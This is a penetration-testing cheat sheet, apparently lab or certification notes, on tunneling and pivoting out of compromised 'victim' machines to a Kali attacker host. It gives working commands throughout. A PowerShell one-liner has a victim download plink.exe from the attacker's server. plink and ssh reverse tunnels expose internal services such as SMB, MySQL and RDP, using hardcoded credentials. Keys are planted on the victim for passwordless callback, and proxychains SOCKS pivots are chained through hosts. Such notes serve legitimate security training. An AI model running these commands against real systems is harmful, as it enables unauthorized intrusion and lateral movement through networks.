---
description: 'Burp > proxychains > app: Settings > Network > Connections > SOCKS Proxy'
---

# Tunneling / (with SSH key)

`sudo netstat -tulpn` to check tunnel connections

### plink ssh to kali from victim

{% code overflow="wrap" %}
```powershell
#victim
netstat -ano #to see undiscovered service during nmap

#kali
python -m http.server 8080 #to host plink
service ssh start

#victim
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.158:8080/plink.exe','C:/hfs/tmp/plink.exe')

cmd.exe /c echo y | plink.exe -ssh -l kali -pw kalipwd -R 192.168.119.158:7799:127.0.0.1:445 192.168.119.158

#kali
nmap -sT -sV -sC 127.0.0.1 7799 
```
{% endcode %}

:445 = internal service ; :7799 = kali tunnel port to the target :445

{% code overflow="wrap" %}
```powershell
#machine C
plink.exe -ssh -l b.user -pw b.pwd -N -R 10.1.1.9:1069:127.0.0.1:9050 10.1.1.9

#machine B 10.1.1.9
plink.exe -ssh -l kali -pw kalipwd -N -R 192.168.119.158:7799:127.0.0.1:1069 192.168.119.158

```
{% endcode %}

tunneling machine C :9050 to kali :7799 through machine B :1069

### ssh to victim from kali

{% code overflow="wrap" %}
```bash
/etc/proxychains4.conf:
socks4 	127.0.0.1 9050
socks4 	127.0.0.1 9060

sudo ssh -N -D 127.0.0.1:9050 sean@10.11.1.251 

sudo ssh -N -D 127.0.0.1:9060 j0hn@10.11.1.252 -p 22000 -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa
```
{% endcode %}

{% hint style="info" %}
may use `-i {cracked key id}` flag if have [Authorized\_key](../password-attack/ssh-authorized\_key-reuse/) cracked

or `-i {authorized_key}` if placed kali's key in the victim
{% endhint %}

pivot machine 8888 to windows victim 3389 (need victim pw)

<pre><code>ssh -L -f 8888:192.168.1.90:3389 root@192.168.1.90 #-f bg 
<strong>( on pivot machine rdp 127.0.0.1:8888)
</strong></code></pre>

kali connect to pivot machine 8888 to final victim 3389

```
rdp 192.168.2.90:8888
```

### ssh from victim to kali

after [finding](../reconnaissance/nmap-masscan-autorecon.md#no-nmap-approach) which port is opened on the next client from 1st victim&#x20;

{% code overflow="wrap" %}
```bash
# bind next client :22 to kali 1122, next client 3306 to kali 13306
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.45.5
```
{% endcode %}

prevent ssh from asking for kali pwd with id\_rsa

{% code overflow="wrap" %}
```bash
# in /tmp on 1st victim
mkdir keys
cd keys
ssh-keygen
> /tmp/keys/id_rsa
cat id_rsa.pub

cop to kali ~/.ssh/authorized_keys
```
{% endcode %}

dynamic port forwarding

{% code overflow="wrap" %}
```
/etc/proxychains4.conf:
socks4 	127.0.0.1 9050

ssh -f -N -R 9050 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i
/tmp/keys/id_rsa kali@192.168.119.173
```
{% endcode %}

#### windows allowing other access local :80&#x20;

```
# 192.168.1.90:8080 = victim:80 (initiate from victim)
ssh -R 8080:internalwww:80 user@192.168.1.90
```

{% embed url="https://woshub.com/ssh-tunnel-port-forward-windows/" %}
